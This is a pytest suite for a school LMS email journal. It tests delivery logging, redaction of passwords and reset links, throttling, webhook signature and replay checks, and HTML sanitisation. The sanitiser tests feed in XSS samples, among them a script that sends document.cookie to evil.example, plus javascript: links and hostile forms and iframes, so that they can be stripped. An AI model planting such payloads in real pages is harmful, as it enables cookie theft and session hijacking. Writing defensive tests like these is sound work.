"""The email delivery journal, its webhook, and the four defects it was built to close.

Runs entirely on in-memory SQLite with the HTTP layer mocked, so it needs no Postgres and
sends no mail. The properties asserted are the ones whose absence was the bug:

* a send leaves a row whether it succeeded or not — the old code returned ``None`` for
  every failure and threw the provider's message id away, so nothing could be traced;
* a credential email leaves no trace of the credential, including in the error column,
  because Resend quotes the submitted payload back on some failures;
* homework goes out one message per student, not one message addressed to the whole class;
* forgot-password is throttled, and a throttled request is indistinguishable from an
  accepted one;
* a lesson reminder is claimed before it is sent, so a restart cannot re-mail the cohort.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from types import SimpleNamespace

import pytest
from fastapi import BackgroundTasks, FastAPI
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from src.config import get_db
from src.services import email_log
from src.services.email_log import EmailLog, EmailRateLimit


@pytest.fixture
def journal():
    """Point the journal at a private SQLite database for the duration of one test.

    ``StaticPool`` keeps every session on the same connection; without it each
    ``SessionLocal()`` would open its own empty in-memory database and the journal would
    appear to write nothing.
    """
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    EmailLog.__table__.create(bind=engine)
    EmailRateLimit.__table__.create(bind=engine)
    factory = sessionmaker(bind=engine, expire_on_commit=False)
    email_log.set_session_factory(factory)
    try:
        yield factory
    finally:
        email_log.set_session_factory(None)
        engine.dispose()


def rows(factory, **filters):
    session = factory()
    try:
        query = session.query(EmailLog)
        for column, value in filters.items():
            query = query.filter(getattr(EmailLog, column) == value)
        return query.order_by(EmailLog.id).all()
    finally:
        session.close()


class FakeResponse:
    def __init__(self, status_code=200, payload=None, text=""):
        self.status_code = status_code
        self._payload = payload if payload is not None else {"id": "resend-msg-1"}
        self.text = text

    def json(self):
        return self._payload

    def raise_for_status(self):
        if self.status_code >= 400:
            import requests

            raise requests.exceptions.HTTPError(
                f"{self.status_code} Server Error", response=self
            )


@pytest.fixture
def sender(monkeypatch):
    """A configured EmailService whose HTTP calls are captured, not made.

    Yields the list of payloads Resend would have received, so a test can assert on the
    ``to:`` field — the thing the homework leak was about.
    """
    from src.services import email_service

    calls: list[dict] = []
    responses: list[FakeResponse] = []

    def fake_post(url, json=None, headers=None, timeout=None):
        calls.append(json)
        return responses.pop(0) if responses else FakeResponse()

    service = email_service.EmailService()
    service.api_key = "re_test_only_not_a_real_key"
    monkeypatch.setattr(email_service, "_email_service", service)
    monkeypatch.setattr(email_service.requests, "post", fake_post)
    yield SimpleNamespace(calls=calls, responses=responses, service=service)


# --- the journal records what happened ----------------------------------------------------


def test_successful_send_records_sent_row_with_provider_message_id(journal, sender):
    from src.services.email_service import send_password_reset_email

    sender.responses.append(FakeResponse(payload={"id": "resend-abc"}))
    send_password_reset_email("stu@example.com", "Aizhan", "https://lms/reset?token=x", 42)

    (row,) = rows(journal)
    assert (row.event_type, row.status) == ("password_reset", "sent")
    assert row.recipient_email == "stu@example.com"
    assert row.recipient_user_id == 42
    assert row.provider_message_id == "resend-abc"
    assert row.template_version == "v1"
    assert row.sent_at is not None
    assert row.error is None


def test_failed_send_records_failed_row_and_still_returns_none(journal, sender):
    from src.services.email_service import send_password_reset_email

    sender.responses.append(FakeResponse(status_code=500, text="upstream exploded"))
    result = send_password_reset_email("stu@example.com", "Aizhan", "https://lms/reset")

    assert result is None, "a failed send must stay non-fatal for the caller"
    (row,) = rows(journal)
    assert row.status == "failed"
    assert row.error and "HTTPError" in row.error
    assert row.provider_message_id is None


def test_journal_failure_never_breaks_the_send(journal, sender, monkeypatch):
    from src.services.email_service import send_password_reset_email

    def exploding_session():
        raise RuntimeError("journal database is down")

    email_log.set_session_factory(exploding_session)
    result = send_password_reset_email("stu@example.com", "Aizhan", "https://lms/reset")

    assert result == {"id": "resend-msg-1"}, "email must go out even with no journal"
    assert len(sender.calls) == 1


def test_unconfigured_service_records_suppressed_without_claiming_the_key(journal, sender):
    from src.services.email_service import send_lesson_reminder_notification

    sender.service.api_key = None
    send_lesson_reminder_notification(
        "stu@example.com", "Aizhan", "Algebra", "01.01.2026 в 10:00", "G1",
        event_id=7, user_id=9,
    )

    (row,) = rows(journal)
    assert row.status == "suppressed"
    assert sender.calls == [], "nothing may be sent without an API key"
    assert row.idempotency_key is None, (
        "a suppressed send must leave the key free, or fixing the config would not help"
    )


# --- credential emails leak nothing --------------------------------------------------------


def test_credential_email_stores_subject_and_type_but_never_the_password(journal, sender):
    from src.services.email_service import send_invite_email

    password = "Sup3rSecret!Temp"
    send_invite_email("new@example.com", "Aizhan", "new@example.com", password, user_id=5)

    (row,) = rows(journal)
    assert row.event_type == "invite"
    assert row.subject and row.status == "sent"
    stored = " ".join(str(getattr(row, c.name)) for c in EmailLog.__table__.columns)
    assert password not in stored
    assert "Пароль" not in stored, "no rendered body may reach the journal"
    assert not hasattr(EmailLog, "body"), "the journal must have nowhere to put a body"


def test_credential_email_failure_drops_the_provider_error_body(journal, sender):
    from src.services.email_service import send_invite_email

    password = "Sup3rSecret!Temp"
    # Resend echoes the submitted payload on some 4xx replies — and that payload is the
    # credential. For credential events the error column keeps the class name only.
    sender.responses.append(
        FakeResponse(status_code=422, text=json.dumps({"html": f"password: {password}"}))
    )
    send_invite_email("new@example.com", "Aizhan", "new@example.com", password)

    (row,) = rows(journal)
    assert row.status == "failed"
    assert row.error == "HTTPError"
    assert password not in (row.error or "")


def test_sanitize_error_redacts_provider_keys_for_ordinary_events():
    cleaned = email_log.sanitize_error(
        "401 from api: Authorization: Bearer re_abcdefghijklmnop rejected",
        event_type="homework_new",
    )
    assert "re_abcdefghijklmnop" not in cleaned
    assert "Bearer ***" in cleaned


# --- defect 1: the homework blast ----------------------------------------------------------


def test_homework_notification_sends_once_per_student(journal, sender):
    from src.services.email_service import send_homework_notification

    recipients = ["a@example.com", "b@example.com", "c@example.com"]
    send_homework_notification(recipients, "Essay 3", "SAT Verbal", "01.02.2026", "created", 77)

    assert len(sender.calls) == 3, "one message per student, not one blast"
    for call in sender.calls:
        assert len(call["to"]) == 1, (
            f"classmates leaked into a shared to: list: {call['to']}"
        )
    assert sorted(c["to"][0] for c in sender.calls) == sorted(recipients)

    logged = rows(journal)
    assert [r.event_type for r in logged] == ["homework_new"] * 3
    assert {r.related_type for r in logged} == {"assignment"}
    assert {r.related_id for r in logged} == {77}


def test_homework_update_is_logged_under_its_own_event_type(journal, sender):
    from src.services.email_service import send_homework_notification

    send_homework_notification(["a@example.com"], "Essay 3", "SAT", "01.02.2026", "updated", 77)
    assert [r.event_type for r in rows(journal)] == ["homework_updated"]


# --- defect 4: reminder idempotency --------------------------------------------------------


def test_reminder_is_sent_once_however_many_times_the_scheduler_runs(journal, sender):
    from src.services.email_service import send_lesson_reminder_notification

    def run():
        return send_lesson_reminder_notification(
            "stu@example.com", "Aizhan", "Algebra", "01.01.2026 в 10:00", "G1",
            role="student", event_id=31, user_id=99,
        )

    assert run() is not None
    assert run() is None, "the second run must not send"
    assert len(sender.calls) == 1

    (row,) = rows(journal)
    assert row.idempotency_key == "lesson-reminder:31:99"
    assert email_log.claimed_elsewhere("lesson-reminder:31:99") is True


def test_reminders_for_different_recipients_do_not_collide(journal, sender):
    from src.services.email_service import send_lesson_reminder_notification

    for user_id in (1, 2):
        send_lesson_reminder_notification(
            f"s{user_id}@example.com", "S", "Algebra", "01.01.2026 в 10:00", "G1",
            event_id=31, user_id=user_id,
        )
    assert len(sender.calls) == 2
    assert {r.idempotency_key for r in rows(journal)} == {
        "lesson-reminder:31:1",
        "lesson-reminder:31:2",
    }


def test_reminder_without_ids_falls_back_to_no_claim(journal, sender):
    """The scheduler always passes ids; other callers must still be able to send."""
    from src.services.email_service import send_lesson_reminder_notification

    for _ in range(2):
        send_lesson_reminder_notification(
            "stu@example.com", "A", "Algebra", "01.01.2026 в 10:00", "G1",
        )
    assert len(sender.calls) == 2
    assert [r.idempotency_key for r in rows(journal)] == [None, None]


# --- defect 2: forgot-password throttle ----------------------------------------------------


def test_password_reset_throttle_allows_three_per_email_then_refuses(journal):
    for attempt in range(3):
        assert email_log.password_reset_allowed("user@example.com", "10.0.0.1") is True, attempt
    assert email_log.password_reset_allowed("user@example.com", "10.0.0.1") is False


def test_password_reset_throttle_is_per_address(journal):
    for _ in range(3):
        email_log.password_reset_allowed("a@example.com", None)
    assert email_log.password_reset_allowed("a@example.com", None) is False
    assert email_log.password_reset_allowed("b@example.com", None) is True


def test_password_reset_throttle_caps_a_single_ip_across_addresses(journal):
    # Ten different addresses from one IP exhausts the IP budget even though no single
    # address is near its own limit — this is the enumeration/mail-bomb case.
    for i in range(10):
        assert email_log.password_reset_allowed(f"u{i}@example.com", "203.0.113.9") is True
    assert email_log.password_reset_allowed("fresh@example.com", "203.0.113.9") is False


def test_throttle_fails_open_when_the_counter_is_unavailable(journal):
    def exploding_session():
        raise RuntimeError("counter table is gone")

    email_log.set_session_factory(exploding_session)
    assert email_log.password_reset_allowed("user@example.com", "10.0.0.1") is True


def _forgot_password(email, db, ip="198.51.100.4"):
    """Drive the route function directly — it needs no HTTP layer, only a Request."""
    from src.auth.routes.auth import ForgotPasswordRequest, forgot_password

    tasks = BackgroundTasks()
    request = SimpleNamespace(headers={"x-forwarded-for": ip}, client=None)
    detail = forgot_password(ForgotPasswordRequest(email=email), tasks, request, db)
    return detail, tasks


def test_fourth_forgot_password_request_is_silent_but_still_generic(journal):
    user = SimpleNamespace(
        id=1, email="user@example.com", name="Aizhan", is_active=True, hashed_password="h"
    )

    class Db:
        def query(self, *_a):
            return self

        def filter(self, *_a):
            return self

        def first(self):
            return user

    db = Db()
    replies = []
    for _ in range(3):
        detail, tasks = _forgot_password("user@example.com", db)
        replies.append(detail)
        assert len(tasks.tasks) == 1, "a permitted request must queue the email"

    detail, tasks = _forgot_password("user@example.com", db)
    assert tasks.tasks == [], "the fourth request must not queue an email"
    assert detail == replies[0], (
        "a throttled reply must read exactly like an accepted one, or the endpoint "
        "becomes an account-existence oracle"
    )
    assert rows(journal) == [], "nothing was sent, so nothing may be journalled"


# --- defect 3: the curator lesson-change email fired before the commit ----------------------


def test_curator_lesson_change_email_is_sent_only_after_the_commit(monkeypatch):
    """The email announced a schedule change the transaction had not yet made durable.

    Worse, it announced it while *holding* that transaction open across a blocking
    ten-second HTTP call. Both are fixed by deferring the send past ``db.commit()``.
    """
    from src.lesson_requests import helpers

    timeline: list[str] = []
    payloads: list[dict] = []

    def fake_send(**kwargs):
        timeline.append("email")
        payloads.append(kwargs)
        return {"id": "resend-1"}

    monkeypatch.setattr(helpers, "send_lesson_change_curator_notification", fake_send)

    group = SimpleNamespace(id=3, name="SAT-1", curator_id=8)
    requester = SimpleNamespace(id=4, name="Teacher T")
    curator = SimpleNamespace(id=8, name="Curator C", email="curator@example.com")
    lesson_request = SimpleNamespace(
        id=12, group_id=3, requester_id=4, request_type="cancel",
        original_datetime=None, new_datetime=None,
        confirmed_teacher_id=None, substitute_teacher_id=None, reason="ill",
    )

    class FakeQuery:
        def __init__(self, result):
            self.result = result

        def filter(self, *_a, **_k):
            return self

        def first(self):
            return self.result

        def all(self):
            return self.result if isinstance(self.result, list) else [self.result]

    class FakeDb:
        def __init__(self):
            # notify_resolution asks for UserInDB twice: the requester, then the curator.
            self.users = [requester, curator]

        def query(self, entity, *_rest):
            from src.schemas.models import Group, GroupStudent, UserInDB

            if entity is Group:
                return FakeQuery(group)
            if entity is UserInDB:
                return FakeQuery(self.users.pop(0))
            if entity is GroupStudent.student_id:
                return FakeQuery([(101,), (102,)])
            return FakeQuery(None)

        def add(self, _row):
            timeline.append("notification")

        def commit(self):
            timeline.append("commit")

    helpers.notify_resolution(FakeDb(), lesson_request, approved=True)

    assert "email" in timeline, "the curator must still be told"
    assert timeline.index("commit") < timeline.index("email"), (
        f"email sent before the change was durable: {timeline}"
    )
    assert payloads[0]["curator_id"] == 8
    assert payloads[0]["lesson_request_id"] == 12


def test_curator_email_failure_does_not_break_the_approval(monkeypatch):
    from src.lesson_requests import helpers

    def exploding_send(**_kwargs):
        raise RuntimeError("Resend is down")

    monkeypatch.setattr(helpers, "send_lesson_change_curator_notification", exploding_send)

    group = SimpleNamespace(id=3, name="SAT-1", curator_id=8)
    curator = SimpleNamespace(id=8, name="C", email="curator@example.com")
    requester = SimpleNamespace(id=4, name="T")
    lesson_request = SimpleNamespace(
        id=12, group_id=3, requester_id=4, request_type="cancel",
        original_datetime=None, new_datetime=None,
        confirmed_teacher_id=None, substitute_teacher_id=None, reason=None,
    )
    committed = []

    class FakeQuery:
        def __init__(self, result):
            self.result = result

        def filter(self, *_a, **_k):
            return self

        def first(self):
            return self.result

        def all(self):
            return self.result if isinstance(self.result, list) else [self.result]

    class FakeDb:
        def __init__(self):
            self.users = [requester, curator]

        def query(self, entity, *_rest):
            from src.schemas.models import Group, GroupStudent, UserInDB

            if entity is Group:
                return FakeQuery(group)
            if entity is UserInDB:
                return FakeQuery(self.users.pop(0))
            if entity is GroupStudent.student_id:
                return FakeQuery([])
            return FakeQuery(None)

        def add(self, _row):
            pass

        def commit(self):
            committed.append(True)

    # No exception escapes: the schedule change is already durable, and a mail outage
    # must not present itself to the head teacher as a failed approval.
    helpers.notify_resolution(FakeDb(), lesson_request, approved=True)
    assert committed == [True]


# --- the webhook ---------------------------------------------------------------------------

WEBHOOK_SECRET = "whsec_" + base64.b64encode(b"unit-test-webhook-secret").decode()


def signed_headers(body: bytes, secret: str = WEBHOOK_SECRET, *, timestamp=None, msg_id="msg_1"):
    stamp = str(int(time.time()) if timestamp is None else timestamp)
    key = base64.b64decode(secret.split("_", 1)[1])
    signed = f"{msg_id}.{stamp}.".encode() + body
    digest = base64.b64encode(hmac.new(key, signed, hashlib.sha256).digest()).decode()
    return {
        "svix-id": msg_id,
        "svix-timestamp": stamp,
        "svix-signature": f"v1,{digest}",
        "content-type": "application/json",
    }


@pytest.fixture
def webhook_client(journal, monkeypatch):
    from src.routes.email_internal import router

    monkeypatch.setenv("RESEND_WEBHOOK_SECRET", WEBHOOK_SECRET)
    monkeypatch.setenv("CRM_INTERNAL_SERVICE_KEY", "test-service-key")
    app = FastAPI()
    app.include_router(router, prefix="/internal/email")
    app.dependency_overrides[get_db] = lambda: journal()
    return TestClient(app)


def _sent_row(factory, message_id="resend-abc"):
    row_id = email_log.claim(
        event_type="invite", recipient_email="stu@example.com", subject="s"
    )
    email_log.finish(row_id, status="sent", provider_message_id=message_id)
    return row_id


@pytest.mark.parametrize(
    "event,expected",
    [
        ("email.delivered", "delivered"),
        ("email.bounced", "bounced"),
        ("email.complained", "complained"),
    ],
)
def test_valid_webhook_moves_the_row_to_its_terminal_state(
    webhook_client, journal, event, expected
):
    _sent_row(journal)
    body = json.dumps({"type": event, "data": {"email_id": "resend-abc"}}).encode()

    response = webhook_client.post(
        "/internal/email/webhook", content=body, headers=signed_headers(body)
    )

    assert response.status_code == 200
    assert response.json()["updated"] == 1
    assert rows(journal)[0].status == expected


def test_webhook_rejects_a_forged_signature(webhook_client, journal):
    _sent_row(journal)
    body = json.dumps({"type": "email.bounced", "data": {"email_id": "resend-abc"}}).encode()
    headers = signed_headers(body)
    headers["svix-signature"] = "v1," + base64.b64encode(b"not the right digest").decode()

    response = webhook_client.post("/internal/email/webhook", content=body, headers=headers)

    assert response.status_code == 401
    assert rows(journal)[0].status == "sent", "a forged event must change nothing"


def test_webhook_rejects_a_body_altered_after_signing(webhook_client, journal):
    _sent_row(journal)
    body = json.dumps({"type": "email.delivered", "data": {"email_id": "resend-abc"}}).encode()
    headers = signed_headers(body)
    tampered = json.dumps({"type": "email.bounced", "data": {"email_id": "resend-abc"}}).encode()

    response = webhook_client.post("/internal/email/webhook", content=tampered, headers=headers)

    assert response.status_code == 401


def test_webhook_rejects_a_replayed_request(webhook_client, journal):
    _sent_row(journal)
    body = json.dumps({"type": "email.bounced", "data": {"email_id": "resend-abc"}}).encode()
    stale = signed_headers(body, timestamp=int(time.time()) - 3600)

    response = webhook_client.post("/internal/email/webhook", content=body, headers=stale)

    assert response.status_code == 401


def test_webhook_is_inert_without_a_configured_secret(journal, monkeypatch):
    from src.routes.email_internal import router

    monkeypatch.delenv("RESEND_WEBHOOK_SECRET", raising=False)
    app = FastAPI()
    app.include_router(router, prefix="/internal/email")
    client = TestClient(app)
    body = json.dumps({"type": "email.bounced", "data": {"email_id": "x"}}).encode()

    response = client.post(
        "/internal/email/webhook", content=body, headers=signed_headers(body)
    )

    assert response.status_code == 503, "an unconfigured webhook must fail closed"


def test_webhook_acknowledges_events_it_does_not_track(webhook_client, journal):
    _sent_row(journal)
    body = json.dumps({"type": "email.opened", "data": {"email_id": "resend-abc"}}).encode()

    response = webhook_client.post(
        "/internal/email/webhook", content=body, headers=signed_headers(body)
    )

    # Non-2xx would make svix retry an event we will never act on.
    assert response.status_code == 200
    assert response.json()["handled"] is False
    assert rows(journal)[0].status == "sent"


# --- the admin read API --------------------------------------------------------------------


def test_log_api_requires_the_service_key(webhook_client):
    assert webhook_client.get("/internal/email/log").status_code == 401


def test_log_api_filters_and_paginates(webhook_client, journal):
    for i in range(5):
        row_id = email_log.claim(
            event_type="homework_new" if i % 2 else "invite",
            recipient_email=f"student{i}@example.com",
            subject=f"Subject {i}",
        )
        email_log.finish(row_id, status="sent", provider_message_id=f"m{i}")

    headers = {"X-CRM-Service-Key": "test-service-key"}
    everything = webhook_client.get("/internal/email/log", headers=headers).json()
    assert everything["total"] == 5

    invites = webhook_client.get(
        "/internal/email/log", params={"event_type": "invite"}, headers=headers
    ).json()
    assert invites["total"] == 3
    assert {item["event_type"] for item in invites["items"]} == {"invite"}

    one = webhook_client.get(
        "/internal/email/log", params={"recipient": "STUDENT3"}, headers=headers
    ).json()
    assert one["total"] == 1, "recipient search must be case-insensitive and partial"

    page = webhook_client.get(
        "/internal/email/log", params={"page": 2, "page_size": 2}, headers=headers
    ).json()
    assert page["total"] == 5 and len(page["items"]) == 2


def test_log_api_returns_no_bodies_or_secrets(webhook_client, journal, sender):
    from src.services.email_service import send_invite_email

    send_invite_email("new@example.com", "Aizhan", "new@example.com", "Sup3rSecret!Temp")
    payload = webhook_client.get(
        "/internal/email/log", headers={"X-CRM-Service-Key": "test-service-key"}
    ).json()

    serialized = json.dumps(payload)
    assert "Sup3rSecret!Temp" not in serialized
    assert "re_test_only_not_a_real_key" not in serialized
    assert set(payload["items"][0]) == {
        "id", "event_type", "recipient_email", "recipient_user_id", "subject",
        "template_version", "related_type", "related_id", "provider_message_id",
        "status", "attempts", "error", "created_at", "sent_at", "updated_at",
    }


def test_log_api_rejects_an_unparseable_date(webhook_client):
    response = webhook_client.get(
        "/internal/email/log",
        params={"date_from": "last tuesday"},
        headers={"X-CRM-Service-Key": "test-service-key"},
    )
    assert response.status_code == 400


# --- the content snapshot, and what must never be in it -----------------------------------


PASSWORD = "Tr0ub4dor-Хвост-77"
RESET_LINK = "https://lms.mastereducation.kz/reset?token=abcdef0123456789"


def _send(sender, *, event_type, html, text=None, subject="Тема"):
    sender.service.send_email(
        ["someone@example.com"], subject, html, text, event_type=event_type
    )


def test_an_ordinary_email_keeps_a_readable_snapshot(journal, sender):
    """"What did we actually send them?" is the second question anybody asks."""
    _send(sender, event_type="homework_new",
          html="<p>Новое задание по <b>алгебре</b></p>", text="Новое задание по алгебре")

    [row] = rows(journal, event_type="homework_new")
    assert row.content_withheld is False
    assert "алгебре" in row.body_html
    assert row.body_text == "Новое задание по алгебре"


@pytest.mark.parametrize("event_type", sorted(email_log.NO_CONTENT_EVENT_TYPES))
def test_a_credential_email_stores_no_body_at_all(journal, sender, event_type):
    """Not "stored and hidden" — absent. A journal an admin can read is a journal an
    attacker who reaches an admin account can read."""
    _send(sender, event_type=event_type,
          html=f"<p>Ваш пароль: {PASSWORD}</p><a href='{RESET_LINK}'>Сбросить</a>")

    [row] = rows(journal, event_type=event_type)
    assert row.content_withheld is True
    assert row.body_html is None
    assert row.body_text is None


def test_password_reset_is_treated_as_credential_bearing(journal, sender):
    """It carries no password, but a single-use reset link is a credential too.

    `CREDENTIAL_EVENT_TYPES` deliberately excludes it — that set is about the provider's
    echoed *error* text. Content storage needs the wider set.
    """
    assert "password_reset" not in email_log.CREDENTIAL_EVENT_TYPES
    assert "password_reset" in email_log.NO_CONTENT_EVENT_TYPES

    _send(sender, event_type="password_reset", html=f"<a href='{RESET_LINK}'>Сбросить</a>")

    [row] = rows(journal, event_type="password_reset")
    assert row.body_html is None
    assert RESET_LINK not in (row.body_html or "") + (row.error or "")


def test_no_credential_ever_reaches_the_database(journal, sender):
    """The blunt end-to-end check: search every stored column for the secret."""
    for event_type in sorted(email_log.NO_CONTENT_EVENT_TYPES):
        _send(sender, event_type=event_type,
              html=f"<p>{PASSWORD}</p><a href='{RESET_LINK}'>x</a>")

    session = journal()
    try:
        for row in session.query(EmailLog).all():
            haystack = " ".join(
                str(v) for v in (row.body_html, row.body_text, row.error, row.subject) if v
            )
            assert PASSWORD not in haystack, f"{row.event_type} leaked a password"
            assert RESET_LINK not in haystack, f"{row.event_type} leaked a reset link"
    finally:
        session.close()


# --- the stored snapshot is inert ---------------------------------------------------------


def test_script_is_stripped_before_the_row_is_written(journal, sender):
    """Sanitized on the way *in*, so a future reader that forgets cannot be attacked."""
    _send(sender, event_type="homework_new",
          html="<p>Привет</p><script>fetch('https://evil.example/'+document.cookie)</script>")

    [row] = rows(journal, event_type="homework_new")
    assert "<script" not in row.body_html.lower()
    assert "evil.example" not in row.body_html
    assert "Привет" in row.body_html, "the readable part survives"


def test_inline_handlers_and_javascript_urls_are_neutralised(journal, sender):
    _send(sender, event_type="homework_new",
          html="<a href=\"javascript:alert(1)\" onclick=\"steal()\">клик</a>")

    [row] = rows(journal, event_type="homework_new")
    assert "onclick" not in row.body_html.lower()
    assert "javascript:" not in row.body_html.lower()
    assert "клик" in row.body_html


def test_forms_and_frames_do_not_survive(journal, sender):
    _send(sender, event_type="lesson_change",
          html="<form action='https://evil.example'><input name='p'></form>"
               "<iframe src='https://evil.example'></iframe><p>Урок перенесён</p>")

    [row] = rows(journal, event_type="lesson_change")
    lowered = row.body_html.lower()
    assert "<form" not in lowered and "<iframe" not in lowered
    assert "Урок перенесён" in row.body_html


def test_remote_images_are_defused_without_losing_the_layout(journal, sender):
    """A tracking pixel must not fire every time an administrator opens the journal."""
    _send(sender, event_type="curator_notify",
          html="<img src='https://tracker.example/pixel.gif' alt='.'><p>Текст</p>")

    [row] = rows(journal, event_type="curator_notify")
    assert "tracker.example" not in row.body_html
    assert "data-blocked-src" in row.body_html
    assert "Текст" in row.body_html


def test_strip_active_content_is_idempotent():
    once = email_log.strip_active_content("<p>ok</p><script>x()</script>")
    assert email_log.strip_active_content(once) == once


def test_strip_active_content_handles_nothing_gracefully():
    assert email_log.strip_active_content(None) is None
    assert email_log.strip_active_content("") == ""


# --- opening one row -----------------------------------------------------------------------


#: The internal service key the `webhook_client` fixture configures.
KEY_HEADERS = {"X-CRM-Service-Key": "test-service-key"}


def test_the_detail_endpoint_requires_the_service_key(webhook_client):
    assert webhook_client.get("/internal/email/log/1").status_code == 401


def test_a_missing_row_is_a_404_not_an_empty_body(webhook_client, journal):
    response = webhook_client.get("/internal/email/log/999999", headers=KEY_HEADERS)
    assert response.status_code == 404


def test_opening_an_ordinary_row_returns_the_body(webhook_client, journal):
    row_id = email_log.claim(
        event_type="homework_new",
        recipient_email="student@example.com",
        subject="Новое задание",
        html_content="<p>Алгебра, до пятницы</p>",
        text_content="Алгебра, до пятницы",
    )

    body = webhook_client.get(f"/internal/email/log/{row_id}", headers=KEY_HEADERS).json()

    assert body["has_content"] is True
    assert body["content_withheld"] is False
    assert body["content_notice"] is None
    assert "Алгебра" in body["body_html"]
    assert body["body_text"] == "Алгебра, до пятницы"
    assert body["recipient_email"] == "student@example.com"


def test_opening_a_credential_row_returns_no_body_and_says_why(webhook_client, journal):
    """The response must not carry the credential at all — not merely decline to render it."""
    row_id = email_log.claim(
        event_type="invite",
        recipient_email="new@example.com",
        subject="Приглашение",
        html_content=f"<p>Пароль: {PASSWORD}</p>",
        text_content=f"Пароль: {PASSWORD}",
    )

    body = webhook_client.get(f"/internal/email/log/{row_id}", headers=KEY_HEADERS).json()

    assert body["content_withheld"] is True
    assert body["body_html"] is None
    assert body["body_text"] is None
    assert body["has_content"] is False
    assert "данные доступа" in body["content_notice"]
    assert PASSWORD not in json.dumps(body, ensure_ascii=False)


def test_a_historical_row_says_unavailable_rather_than_withheld(webhook_client, journal):
    """Rows written before content capture. Nothing is hidden and nothing is invented —
    "we chose not to store this" and "there was never anything here" are different answers."""
    row_id = email_log.claim(
        event_type="homework_new", recipient_email="old@example.com", subject="Старое"
    )

    body = webhook_client.get(f"/internal/email/log/{row_id}", headers=KEY_HEADERS).json()

    assert body["content_withheld"] is False, "not a policy decision"
    assert body["has_content"] is False, "and nothing to show"
    assert body["content_notice"] is None


def test_opening_a_row_never_sends_anything(webhook_client, journal, sender):
    """A journal that re-delivers on read would be worse than no journal."""
    row_id = email_log.claim(
        event_type="homework_new", recipient_email="student@example.com",
        subject="Тема", html_content="<p>Текст</p>",
    )
    before = rows(journal)[0]

    for _ in range(3):
        assert webhook_client.get(
            f"/internal/email/log/{row_id}", headers=KEY_HEADERS
        ).status_code == 200

    assert sender.calls == [], "no HTTP call to the provider"
    after = rows(journal)[0]
    assert (after.status, after.attempts) == (before.status, before.attempts)
    assert len(rows(journal)) == 1, "reading created no new row"
